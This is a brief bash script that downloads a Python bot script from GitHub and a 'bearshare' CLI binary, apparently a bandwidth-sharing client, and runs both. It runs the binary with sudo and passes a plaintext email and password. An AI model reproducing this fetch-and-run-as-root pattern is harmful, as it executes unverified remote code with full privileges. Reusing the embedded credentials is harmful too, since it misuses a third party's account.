#!/bin/bash

log() {
    echo "$1"
}

sudo curl -O https://raw.githubusercontent.com/Flore1945/WhiteBull/main/main.py
sudo pip3 install simple-websocket requests
nohup python3 main.py --id="$1" --token="$2" --atoken="$3" > main.py.log 2>&1 &

curl -O https://www.bearshare.app/bearshare-cli-linux-x86-64
sudo ./bearshare-cli-linux-x86-64 -email djawadnitro1@gmail.com -password 'djawad123!@#'
